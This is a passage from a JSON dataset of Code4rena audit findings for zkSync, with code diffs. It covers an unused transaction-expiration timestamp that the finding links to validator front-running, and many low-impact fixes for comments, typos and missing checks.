295](https://github.com/code-423n4/2023-10-zksync/blob/1fb4649b612fac7b4ee613df6f6b7d921ddd6b0d/code/contracts/ethereum/contracts/zksync/facets/Mailbox.sol#L295)\n\n```solidity\n        uint64 expirationTimestamp = uint64(block.timestamp + PRIORITY_EXPIRATION); // Safe to cast\n```\n\nWith:\n\n[Config, line 46](https://github.com/code-423n4/2023-10-zksync/blob/1fb4649b612fac7b4ee613df6f6b7d921ddd6b0d/code/contracts/ethereum/contracts/zksync/Config.sol#L46)\n\n```solidity\nuint256 constant PRIORITY_EXPIRATION = 0 days;\n```\n\nWhich equals `block.timestamp`, which is bad as its value will **NOT** be the time the user submitted the transaction to the network, but the time the transaction is picked by a validator and included in a block. That means, virtually, there is no expiration timestamp for such a transaction.\n\nSome ways to exploit this, from a hacker's POV, is via rogue validators (see [here](https://news.bitcoin.com/rogue-validator-exploits-mev-bots-on-ethereum-resulting-in-25-3m-in-crypto-losses)) or *\"chained transaction-blocks\"*. The idea is that, thanks to POS, the odds for a validator to execute sequentially `n > 2` blocks increases with the amount of ETH staked so it is possible to delay a highly profitable transaction and place it between two validator-controlled blocks and sandwich it on zkSync Era (as they are executed sequentially via [a priority queue](https://github.com/code-423n4/2023-10-zksync/blob/1fb4649b612fac7b4ee613df6f6b7d921ddd6b0d/code/contracts/ethereum/contracts/zksync/facets/Mailbox.sol#L369)). This issue is real and feasible, although pretty expensive, but the damages to users may be huge if they are doing, say, an inter-chain [Furocombo](https://furucombo.app/combo) combo worth 3 million dollars or any other type of highly-sensitive inter-chain operation.\n\n### Recommended Mitigation steps\n\nPass the expiration timestamp as a function argument retrieved from the front-end and revert if it is less than the `block.timestamp` in which the transaction is executed:\n\n[Mailbox, function `requestL2Transaction`](https://github.com/code-423n4/2023-10-zksync/blob/1fb4649b612fac7b4ee613df6f6b7d921ddd6b0d/code/contracts/ethereum/contracts/zksync/facets/Mailbox.sol#L236C1-L273C6)\n\n```diff\n    function requestL2Transaction(\n        address _contractL2,\n        uint256 _l2Value,\n        bytes calldata _calldata,\n        uint256 _l2GasLimit,\n        uint256 _l2GasPerPubdataByteLimit,\n        bytes[] calldata _factoryDeps,\n-       address _refundRecipient\n+       address _refundRecipient,\n+       uint64 _expirationTimestamp\n    ) external payable nonReentrant senderCanCallFunction(s.allowList) returns (bytes32 canonicalTxHash) {\n+       require(_expirationTimestamp > block.timestamp, \"MEV trying to do their things\");\n        // Change the sender address if it is a smart contract to prevent address collision between L1 and L2.\n        // Please note, currently zkSync address derivation is different from Ethereum one, but it may be changed in the future.\n        address sender = msg.sender;\n        if (sender != tx.origin) {\n            sender = AddressAliasHelper.applyL1ToL2Alias(msg.sender);\n        }\n\n        // Enforcing that `_l2GasPerPubdataByteLimit` equals to a certain constant number. This is needed\n        // to ensure that users do not get used to using \"exotic\" numbers for _l2GasPerPubdataByteLimit, e.g. 1-2, etc.\n        // VERY IMPORTANT: nobody should rely on this constant to be fixed and every contract should give their users the ability to provide the\n        // ability to provide `_l2GasPerPubdataByteLimit` for each independent transaction.\n        // CHANGING THIS CONSTANT SHOULD BE A CLIENT-SIDE CHANGE.\n        require(_l2GasPerPubdataByteLimit == REQUIRED_L2_GAS_PRICE_PER_PUBDATA, \"qp\");\n\n        // The L1 -> L2 transaction may be failed and funds will be sent to the `_refundRecipient`,\n        // so we use `msg.value` instead of `_l2Value` as the bridged amount.\n        _verifyDepositLimit(msg.sender, msg.value);\n        canonicalTxHash = _requestL2Transaction(\n            sender,\n            _contractL2,\n            _l2Value,\n            _calldata,\n            _l2GasLimit,\n            _l2GasPerPubdataByteLimit,\n            _factoryDeps,\n            false,\n-           _refundRecipient\n+           _refundRecipient,\n+           _expirationTimestamp\n        );\n    }\n```\n\n[Mailbox, function `_requestL2Transaction`](https://github.com/code-423n4/2023-10-zksync/blob/1fb4649b612fac7b4ee613df6f6b7d921ddd6b0d/code/contracts/ethereum/contracts/zksync/facets/Mailbox.sol#L283C1-L327C6)\n\n```diff\n    function _requestL2Transaction(\n        address _sender,\n        address _contractAddressL2,\n        uint256 _l2Value,\n        bytes calldata _calldata,\n        uint256 _l2GasLimit,\n        uint256 _l2GasPerPubdataByteLimit,\n        bytes[] calldata _factoryDeps,\n        bool _isFree,\n-       address _refundRecipient\n+       address _refundRecipient,\n+       uint64 _expirationTimestamp\n    ) internal returns (bytes32 canonicalTxHash) {\n        require(_factoryDeps.length <= MAX_NEW_FACTORY_DEPS, \"uj\");\n-       uint64 expirationTimestamp = uint64(block.timestamp + PRIORITY_EXPIRATION); // Safe to cast\n        uint256 txId = s.priorityQueue.getTotalPriorityTxs();\n\n        // Here we manually assign fields for the struct to prevent \"stack too deep\" error\n        WritePriorityOpParams memory params;\n\n        // Checking that the user provided enough ether to pay for the transaction.\n        // Using a new scope to prevent \"stack too deep\" error\n        {\n            params.l2GasPrice = _isFree ? 0 : _deriveL2GasPrice(tx.gasprice, _l2GasPerPubdataByteLimit);\n            uint256 baseCost = params.l2GasPrice * _l2GasLimit;\n            require(msg.value >= baseCost + _l2Value, \"mv\"); // The `msg.value` doesn't cover the transaction cost\n        }\n\n        // If the `_refundRecipient` is not provided, we use the `_sender` as the recipient.\n        address refundRecipient = _refundRecipient == address(0) ? _sender : _refundRecipient;\n        // If the `_refundRecipient` is a smart contract, we apply the L1 to L2 alias to prevent foot guns.\n        if (refundRecipient.code.length > 0) {\n            refundRecipient = AddressAliasHelper.applyL1ToL2Alias(refundRecipient);\n        }\n\n        params.sender = _sender;\n        params.txId = txId;\n        params.l2Value = _l2Value;\n        params.contractAddressL2 = _contractAddressL2;\n-       params.expirationTimestamp = expirationTimestamp;\n+       params.expirationTimestamp = _expirationTimestamp;\n        params.l2GasLimit = _l2GasLimit;\n        params.l2GasPricePerPubdata = _l2GasPerPubdataByteLimit;\n        params.valueToMint = msg.value;\n        params.refundRecipient = refundRecipient;\n\n        canonicalTxHash = _writePriorityOp(params, _calldata, _factoryDeps);\n    }\n```\n\nOn top of that, change the `deposit` functions in both bridges to match the ABI of the new `requestL2Transaction` and remove the `PRIORITY_EXPIRATION` constant in [Config, line 46](https://github.com/code-423n4/2023-10-zksync/blob/1fb4649b612fac7b4ee613df6f6b7d921ddd6b0d/code/contracts/ethereum/contracts/zksync/Config.sol#L46).\n\n### References\n\n[https://blog.uniswap.org/uniswap-v3-oracles?utm_source=blog.bytes032.xyz&utm_medium=referral&utm_campaign=why-you-should-stop-using-block-timestamp-as-deadline-in-swaps#how-much-does-a-two-block-20-manipulation-require](https://blog.uniswap.org/uniswap-v3-oracles?utm_source=blog.bytes032.xyz&utm_medium=referral&utm_campaign=why-you-should-stop-using-block-timestamp-as-deadline-in-swaps#how-much-does-a-two-block-20-manipulation-require)\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "zkSync",
      "source_link": "https://code4rena.com/reports/2023-10-zksync",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "30340",
      "title": "[38] `PointProjective::add_assign_mixed` missing code",
      "impact": "LOW",
      "content": "\n[secp256k1/mod.rs, line 486](https://github.com/code-423n4/2023-10-zksync/blob/1fb4649b612fac7b4ee613df6f6b7d921ddd6b0d/code/era-zkevm_circuits/src/ecrecover/secp256k1/mod.rs#L486)\n\n```diff\n            ...\n\n        } else {\n            // If we're adding -a and a together, self.z becomes zero as H becomes zero.\n\n+           if u1 == u2 {\n+               (*self) = Self::zero();\n+               return;\n+           }\n\n            // H = U2-X1\n            let mut h = u2;\n\n            ...\n```\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "zkSync",
      "source_link": "https://code4rena.com/reports/2023-10-zksync",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "30339",
      "title": "[37] `PointProjective::mul_assign` optimization",
      "impact": "LOW",
      "content": "\n[secp256k1/mod.rs, line 543](https://github.com/code-423n4/2023-10-zksync/blob/1fb4649b612fac7b4ee613df6f6b7d921ddd6b0d/code/era-zkevm_circuits/src/ecrecover/secp256k1/mod.rs#L543)\n\n```diff\n    fn mul_assign<S: Into<<Self::Scalar as PrimeField>::Repr>>(&mut self, other: S) {\n+       if self.is_zero() {\n+           return; // 0 *= a equals 0\n+       }\n\n+       if other.is_zero() {\n+           (*self) = Self::zero(); // a *= 0 equals 0\n+           return;\n+       }\n\n        let mut res = Self::zero();\n\n        ...\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "zkSync",
      "source_link": "https://code4rena.com/reports/2023-10-zksync",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "30338",
      "title": "[36] Wrong comment in EmptyContract",
      "impact": "LOW",
      "content": "\n[DefaultAccount, line 15](https://github.com/code-423n4/2023-10-zksync/blob/1fb4649b612fac7b4ee613df6f6b7d921ddd6b0d/code/system-contracts/contracts/DefaultAccount.sol#L15)\n\n```solidity\n * @dev The bytecode of the contract is set by default for all addresses for which no other bytecodes are deployed.\n```\n\n[EmptyContract, line 9](https://github.com/code-423n4/2023-10-zksync/blob/1fb4649b612fac7b4ee613df6f6b7d921ddd6b0d/code/system-contracts/contracts/EmptyContract.sol#L9)\n\n```solidity\n * @dev The bytecode of the contract is set by default for all addresses for which no other bytecodes are deployed.\n```\n\nCopy-pasted, remove the `EmptyContract` one.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "zkSync",
      "source_link": "https://code4rena.com/reports/2023-10-zksync",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "30337",
      "title": "[35] Comment and code mismatch",
      "impact": "LOW",
      "content": "\nIn [bootloader, line 1116](https://github.com/code-423n4/2023-10-zksync/blob/1fb4649b612fac7b4ee613df6f6b7d921ddd6b0d/code/system-contracts/bootloader/bootloader.yul#L1116C77-L1116C120), it says it calculates the L2 gas limit without taking into account the intrinsic costs and the overhead. However, they are, as seen in:\n\n[Bootloader, lines 1151 to 1172](https://github.com/code-423n4/2023-10-zksync/blob/1fb4649b612fac7b4ee613df6f6b7d921ddd6b0d/code/system-contracts/bootloader/bootloader.yul#L1151C1-L1172C18)\n\n```solidity\n                let operatorOverheadForTransaction := getVerifiedOperatorOverheadForTx(\n                    transactionIndex,\n                    totalGasLimit,\n                    gasPerPubdata,\n                    txEncodingLen\n                )\n                gasLimitForTx := safeSub(totalGasLimit, operatorOverheadForTransaction, \"qr\")\n\n                let intrinsicOverhead := safeAdd(\n                    intrinsicGas, \n                    // the error messages are trimmed to fit into 32 bytes\n                    safeMul(intrinsicPubdata, gasPerPubdata, \"qw\"),\n                    \"fj\" \n                )\n\n                switch lt(gasLimitForTx, intrinsicOverhead)\n                case 1 {\n                    gasLimitForTx := 0\n                }\n                default {\n                    gasLimitForTx := sub(gasLimitForTx, intrinsicOverhead)\n                }\n```\n\nRemove that statement:\n\n```diff\n-            /// @dev Calculates the L2 gas limit for the transaction's body, i.e. without intrinsic costs and overhead.\n+            /// @dev Calculates the L2 gas limit for the transaction's body\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "zkSync",
      "source_link": "https://code4rena.com/reports/2023-10-zksync",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "30336",
      "title": "[34] Do not let users put as `refundRecipient` addresses in kernel space",
      "impact": "LOW",
      "content": "\n[Mailbox, lines 309 to 315](https://github.com/code-423n4/2023-10-zksync/blob/1fb4649b612fac7b4ee613df6f6b7d921ddd6b0d/code/contracts/ethereum/contracts/zksync/facets/Mailbox.sol#L309C1-L315C1)\n\n```diff\n        // If the `_refundRecipient` is not provided, we use the `_sender` as the recipient.\n        address refundRecipient = _refundRecipient == address(0) ? _sender : _refundRecipient;\n        // If the `_refundRecipient` is a smart contract, we apply the L1 to L2 alias to prevent foot guns.\n        if (refundRecipient.code.length > 0) {\n            refundRecipient = AddressAliasHelper.applyL1ToL2Alias(refundRecipient);\n        }\n+       require(refundRecipient > address(0xFFFF), \"You can't send your pennies to the kernel\");\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "zkSync",
      "source_link": "https://code4rena.com/reports/2023-10-zksync",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "30335",
      "title": "[33] Wrong `debugLog` call",
      "impact": "LOW",
      "content": "\nIn [bootloader, line 1110](https://github.com/code-423n4/2023-10-zksync/blob/1fb4649b612fac7b4ee613df6f6b7d921ddd6b0d/code/system-contracts/bootloader/bootloader.yul#L1110), you \"log\" that the refund is `0` when it may be not be:\n\n```diff\n-               debugLog(\"refund\", 0)\n+               debugLog(\"refund\", refund)\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "zkSync",
      "source_link": "https://code4rena.com/reports/2023-10-zksync",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "30334",
      "title": "[32] You are not using your own cached `virtualBlockInfo` in `SystemContext`",
      "impact": "LOW",
      "content": "\n```solidity\n        BlockInfo memory virtualBlockInfo = currentVirtualL2BlockInfo;\n\n// TODO why are you using  currentVirtualL2BlockInfo.number ??\n// TODO it is cached in virtualBlockInfo.number\nif (currentVirtualL2BlockInfo.number == 0 && virtualBlockInfo.timestamp == 0) {\n```\n\nDo this instead:\n\n```diff\n        BlockInfo memory virtualBlockInfo = currentVirtualL2BlockInfo;\n\n-       if (currentVirtualL2BlockInfo.number == 0 && virtualBlockInfo.timestamp == 0) {\n+       if (virtualBlockInfo.number == 0 && virtualBlockInfo.timestamp == 0) {\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "zkSync",
      "source_link": "https://code4rena.com/reports/2023-10-zksync",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "30333",
      "title": "[31] `validateUpgradeTransaction` does return as valid non-upgrade transactions",
      "impact": "LOW",
      "content": "\nPriority transactions has a type-value of `255` and upgrades `254`, as seen in [bootloader, lines 572 to 591](https://github.com/code-423n4/2023-10-zksync/blob/1fb4649b612fac7b4ee613df6f6b7d921ddd6b0d/code/system-contracts/bootloader/bootloader.yul#L572C1-L591C31). However, `validateUpgradeTransaction`, if all the fields of the `_transaction` are correct, accepts transactions with `txType` field different from `254`, as it is not checked:\n\n```solidity\n    function validateUpgradeTransaction(IMailbox.L2CanonicalTransaction memory _transaction) internal pure {\n        // Restrict from to be within system contract range (0...2^16 - 1)\n        require(_transaction.from <= type(uint16).max, \"ua\");\n        require(_transaction.to <= type(uint160).max, \"ub\");\n        require(_transaction.paymaster == 0, \"uc\");\n        require(_transaction.value == 0, \"ud\");\n        require(_transaction.reserved[0] == 0, \"ue\");\n        require(_transaction.reserved[1] <= type(uint160).max, \"uf\");\n        require(_transaction.reserved[2] == 0, \"ug\");\n        require(_transaction.reserved[3] == 0, \"uo\");\n        require(_transaction.signature.length == 0, \"uh\");\n        require(_transaction.paymasterInput.length == 0, \"ul\");\n        require(_transaction.reservedDynamic.length == 0, \"um\");\n    }\n```\n\nJust for completeness, check that `_transaction.txType == 255`:\n\n```diff\n    function validateUpgradeTransaction(IMailbox.L2CanonicalTransaction memory _transaction) internal pure {\n+       require(_transaction.txType == 255, \"WHATEVER\");\n        // Restrict from to be within system contract range (0...2^16 - 1)\n        require(_transaction.from <= type(uint16).max, \"ua\");\n        require(_transaction.to <= type(uint160).max, \"ub\");\n        require(_transaction.paymaster == 0, \"uc\");\n        require(_transaction.value == 0, \"ud\");\n        require(_transaction.reserved[0] == 0, \"ue\");\n        require(_transaction.reserved[1] <= type(uint160).max, \"uf\");\n        require(_transaction.reserved[2] == 0, \"ug\");\n        require(_transaction.reserved[3] == 0, \"uo\");\n        require(_transaction.signature.length == 0, \"uh\");\n        require(_transaction.paymasterInput.length == 0, \"ul\");\n        require(_transaction.reservedDynamic.length == 0, \"um\");\n    }\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "zkSync",
      "source_link": "https://code4rena.com/reports/2023-10-zksync",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "30332",
      "title": "[30] Add getters to some variables of `AppStorage`",
      "impact": "LOW",
      "content": "\nThe variables `zkPorterIsAvaiable`, `totalDepositedAmountPerUser`, `admin` and `pendingAdmin` do not have a proper getter inside the `Getters` facet. Consider adding them.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "zkSync",
      "source_link": "https://code4rena.com/reports/2023-10-zksync",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "30331",
      "title": "[29] Wrong comment in `Diamond`",
      "impact": "LOW",
      "content": "\nThe comment `/// NOTE: expect but NOT enforce that _selectors is NON-EMPTY array` is wrong, as it is checked inside [Diamond, function `diamondCut`](https://github.com/code-423n4/2023-10-zksync/blob/c3ff020df5d11fe91209bd99d7fb0ec1272dc387/code/contracts/ethereum/contracts/zksync/libraries/Diamond.sol#L106C1-L106C80):\n\n```solidity\n            require(selectors.length > 0, \"B\"); // no functions for diamond cut\n```\n\nRemove them (just do `Ctrl+f` as there are three occurrences).\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "zkSync",
      "source_link": "https://code4rena.com/reports/2023-10-zksync",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "30330",
      "title": "[28] `SystemContext::baseFee` is not a constant, although the comment says it is",
      "impact": "LOW",
      "content": "\nThe state variable `baseFee` is not a constant, as the keyword `constant` is missing and its value can be changed in `setNewBatch`. Remove that comment.\n\n[SystemContext, line 47](https://github.com/code-423n4/2023-10-zksync/blob/c3ff020df5d11fe91209bd99d7fb0ec1272dc387/code/system-contracts/contracts/SystemContext.sol#L47)\n\n```diff\n    /// @notice The `block.basefee`.\n-   /// @dev It is currently a constant.\n    uint256 public baseFee;\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "zkSync",
      "source_link": "https://code4rena.com/reports/2023-10-zksync",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "30329",
      "title": "[27] Wrong comment in `ecrecover/secp256k1/mod.rs`",
      "impact": "LOW",
      "content": "\nIn [lines 56 to 58](https://github.com/code-423n4/2023-10-zksync/blob/72f5f16ed4ba94c7689fe38fcb0b7d27d2a3f135/code/era-zkevm_circuits/src/ecrecover/secp256k1/mod.rs#L56C1-L58C40), it is explained how two projective point coordinates are checked against each other to see if both points are equal. However, the comment is wrong, as the formula has switched the places of `Z` and `Z'`:\n\n```diff\n        // The points (X, Y, Z) and (X', Y', Z')\n-       // are equal when (X * Z^2) = (X' * Z'^2)\n-       // and (Y * Z^3) = (Y' * Z'^3).\n+       // are equal when (X * Z'^2) = (X' * Z^2)\n+       // and (Y * Z'^3) = (Y' * Z^3).\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "zkSync",
      "source_link": "https://code4rena.com/reports/2023-10-zksync",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "30328",
      "title": "[26] Wrong comment",
      "impact": "LOW",
      "content": "\n[secp256k1/mod.rs, line 404](https://github.com/code-423n4/2023-10-zksync/blob/1fb4649b612fac7b4ee613df6f6b7d921ddd6b0d/code/era-zkevm_circuits/src/ecrecover/secp256k1/mod.rs#L404)\n\n```diff\n-                // The two points are equal, so we double.\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "zkSync",
      "source_link": "https://code4rena.com/reports/2023-10-zksync",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "30327",
      "title": "[25] Wrong comments in L1 bridges",
      "impact": "LOW",
      "content": "\nIn [L1ERC20Bridge, line 162](https://github.com/code-423n4/2023-10-zksync/blob/72f5f16ed4ba94c7689fe38fcb0b7d27d2a3f135/code/contracts/ethereum/contracts/bridge/L1ERC20Bridge.sol#L162C1-L162C115), the comment says `If the L2 deposit finalization transaction fails, the _refundRecipient will receive the _l2Value`. However,\n\n  - There is no such a parameter in the function.\n  - As it is an ERC20 transfer, the call to [Mailbox, `requestL2Transaction` made in line 198](https://github.com/code-423n4/2023-10-zksync/blob/1fb4649b612fac7b4ee613df6f6b7d921ddd6b0d/code/contracts/ethereum/contracts/bridge/L1ERC20Bridge.sol#L198) has its argument `_l2Value` hard-coded to `0`, so the comment doesn't make sense.\n\nIn [L2ERC20Bridge, line 59](https://github.com/code-423n4/2023-10-zksync/blob/72f5f16ed4ba94c7689fe38fcb0b7d27d2a3f135/code/contracts/zksync/contracts/bridge/L2ERC20Bridge.sol#L59C1-L59C79), the comment says `@param _l2Receiver The account address that would receive minted ether`. However, the bridge is for ERC20 tokens, not for ETH nor WETH.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "zkSync",
      "source_link": "https://code4rena.com/reports/2023-10-zksync",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "30326",
      "title": "[24] Empty error string",
      "impact": "LOW",
      "content": "\nIn [NonceHolder, line 136](https://github.com/code-423n4/2023-10-zksync/blob/72f5f16ed4ba94c7689fe38fcb0b7d27d2a3f135/code/system-contracts/contracts/NonceHolder.sol#L136C66-L136C68) there should be a non-empty error, as it seems you have some in-house bot that listens to the unique errors emitted by your contracts (all errors are different).\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "zkSync",
      "source_link": "https://code4rena.com/reports/2023-10-zksync",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "30325",
      "title": "[23] Typos",
      "impact": "LOW",
      "content": "\n[SystemContractHelper, line 347](https://github.com/code-423n4/2023-10-zksync/blob/72f5f16ed4ba94c7689fe38fcb0b7d27d2a3f135/code/system-contracts/contracts/libraries/SystemContractHelper.sol#L347) - `2-bit IS set`, `not 2-bit it set`.\n\n```diff\n-        // When the system call is passed, the 2-bit it set to 1\n+        // When the system call is passed, the 2-bit is set to 1\n```\n\n[KnownCodesStorage, lines 16 to 17](https://github.com/code-423n4/2023-10-zksync/blob/72f5f16ed4ba94c7689fe38fcb0b7d27d2a3f135/code/system-contracts/contracts/KnownCodesStorage.sol#L16C117-L17C10) - repeated `words`.\n\n```diff\n- * the second byte denotes whether the contract is constructed, and the next two bytes denote the length in 32-byte words.\n- * words. And then the next 28 bytes is the truncated hash.\n+ * the second byte denotes whether the contract is constructed, the next two bytes denote the length in 32-byte words\n+ * and then the next 28 bytes is the truncated hash.\n```\n\n[SystemContext, line 22](https://github.com/code-423n4/2023-10-zksync/blob/72f5f16ed4ba94c7689fe38fcb0b7d27d2a3f135/code/system-contracts/contracts/SystemContext.sol#L22C32-L22C48) - `blocks' hashes`, not `blocks's hashes`.\n\n```diff\n-    /// - Store the latest 257 blocks's hashes.\n+    /// - Store the latest 257 blocks' hashes.\n```\n\n[bootloader, line 38](https://github.com/code-423n4/2023-10-zksync/blob/72f5f16ed4ba94c7689fe38fcb0b7d27d2a3f135/code/system-contracts/bootloader/bootloader.yul#L38C20-L38C60) - `That means the operator controls ...`, not `That it means that the operator controls ...`.\n\n```diff\n-                // That it means that the operator controls\n+                // That means the operator controls\n```\n\n[bootloader, line 652](https://github.com/code-423n4/2023-10-zksync/blob/72f5f16ed4ba94c7689fe38fcb0b7d27d2a3f135/code/system-contracts/bootloader/bootloader.yul#L652C57-L652C84) - `... make sure the operator ...`, not `... make sure that the operator`.\n\n```diff\n-             /// @dev The purpose of this function is to make sure that the operator\n+             /// @dev The purpose of this function is to make sure the operator\n```\n\n[bootloader, line 672](https://github.com/code-423n4/2023-10-zksync/blob/72f5f16ed4ba94c7689fe38fcb0b7d27d2a3f135/code/system-contracts/bootloader/bootloader.yul#L672C32-L672C35) - remove `for`.\n\n```diff\n-                     // Calling for the `payForTransaction` method of the account.\n+                     // Calling the `payForTransaction` method of the account.\n```\n\n[bootloader, line 3164](https://github.com/code-423n4/2023-10-zksync/blob/72f5f16ed4ba94c7689fe38fcb0b7d27d2a3f135/code/system-contracts/bootloader/bootloader.yul#L3164C22-L3164C39) - `Accepts an uint64`, not `Accepts an uint32`.\n\n```diff\n-            /// @dev Accepts an uint32 and returns whether or not it is\n+            /// @dev Accepts an uint64 and returns whether or not it is\n```\n\n[bootloader, lines 3170 to 3171](https://github.com/code-423n4/2023-10-zksync/blob/72f5f16ed4ba94c7689fe38fcb0b7d27d2a3f135/code/system-contracts/bootloader/bootloader.yul#L3170C22-L3171C31) - `Accepts an uint128 and returns wether or not it is a valid uint128`, not `Accepts an uint32 and returns wether or not it is a valid uint64`.\n\n```diff\n-            /// @dev Accepts an uint32 and returns whether or not it is\n-            /// a valid uint64\n+            /// @dev Accepts an uint128 and returns whether or not it is\n+            /// a valid uint128\n```\n\n[keccak256_round_function/mod.rs, lines 87](https://github.com/code-423n4/2023-10-zksync/blob/72f5f16ed4ba94c7689fe38fcb0b7d27d2a3f135/code/era-zkevm_circuits/src/keccak256_round_function/mod.rs#L87), [88](https://github.com/code-423n4/2023-10-zksync/blob/72f5f16ed4ba94c7689fe38fcb0b7d27d2a3f135/code/era-zkevm_circuits/src/keccak256_round_function/mod.rs#L88) and [93](https://github.com/code-423n4/2023-10-zksync/blob/72f5f16ed4ba94c7689fe38fcb0b7d27d2a3f135/code/era-zkevm_circuits/src/keccak256_round_function/mod.rs#L93) - `MEMORY_QUERIES_PER_CYCLE`, not `MEMORY_EQURIES_PER_CYCLE`.\n\n```diff\n- pub const MEMORY_EQURIES_PER_CYCLE: usize = 5; // we need to read as much as possible to use a round function every cycle\n+ pub const MEMORY_QUERIES_PER_CYCLE: usize = 5; // we need to read as much as possible to use a round function every cycle\n- pub const NUM_U64_WORDS_PER_CYCLE: usize = 4 * MEMORY_EQURIES_PER_CYCLE;\n+ pub const NUM_U64_WORDS_PER_CYCLE: usize = 4 * MEMORY_QUERIES_PER_CYCLE;\npub const NEW_BYTES_PER_CYCLE: usize = 8 * NUM_U64_WORDS_PER_CYCLE;\n// we absorb 136 elements per cycle, and add 160 elements per cycle, so we need to skip memory reads\n// sometimes and do absorbs instead\npub const BUFFER_SIZE_IN_U64_WORDS: usize =\n-    MEMORY_EQURIES_PER_CYCLE * 4 + KECCAK256_RATE_IN_U64_WORDS - 1;\n+    MEMORY_QUERIES_PER_CYCLE * 4 + KECCAK256_RATE_IN_U64_WORDS - 1;\n```\n\n[Governance, line 83](https://github.com/code-423n4/2023-10-zksync/blob/72f5f16ed4ba94c7689fe38fcb0b7d27d2a3f135/code/contracts/ethereum/contracts/governance/Governance.sol#L83) - `both` is for two elements, not three.\n\n```diff\n-    /// includes both Waiting, Ready, and Done operations.\n+    /// includes Waiting, Ready, and Done operations.\n```\n\n[NonceHolder, line 18](https://github.com/code-423n4/2023-10-zksync/blob/c3ff020df5d11fe91209bd99d7fb0ec1272dc387/code/system-contracts/contracts/NonceHolder.sol#L18C29-L18C31) - it is `mark`, not `either marked` as it is a sentence without a replica.\n\n```diff\n- * The users can either marked a range of nonces by increasing the `minNonce`. This way all the nonces\n+ * The users can mark a range of nonces by increasing the `minNonce`. This way all the nonces\n```\n\n[NonceHolder, line 29](https://github.com/code-423n4/2023-10-zksync/blob/c3ff020df5d11fe91209bd99d7fb0ec1272dc387/code/system-contracts/contracts/NonceHolder.sol#L29C42-L29C44) - remove the first `at`.\n\n```diff\n-    /// The minNonce can be increased by at 2^32 at a time to prevent it from\n+    /// The minNonce can be increased by 2^32 at a time to prevent it from\n```\n\n[uma.rs, line 222](https://github.com/code-423n4/2023-10-zksync/blob/c3ff020df5d11fe91209bd99d7fb0ec1272dc387/code/era-zkevm_circuits/src/main_vm/opcodes/uma.rs#L222C12-L222C20) - `Ethereum`, not `Etherium`.\n\n```diff\n-    // NB: Etherium virtual machine is big endian;\n+    // NB: Ethereum virtual machine is big endian;\n```\n\n[cycle.rs, line 504](https://github.com/code-423n4/2023-10-zksync/blob/c3ff020df5d11fe91209bd99d7fb0ec1272dc387/code/era-zkevm_circuits/src/main_vm/cycle.rs#L504C8-L504C11) - `Aux`, not `aux`.\n\n```diff\n-    // Axu heap limit\n+    // Aux heap limit\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "zkSync",
      "source_link": "https://code4rena.com/reports/2023-10-zksync",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "30324",
      "title": "[22] Missing comments",
      "impact": "LOW",
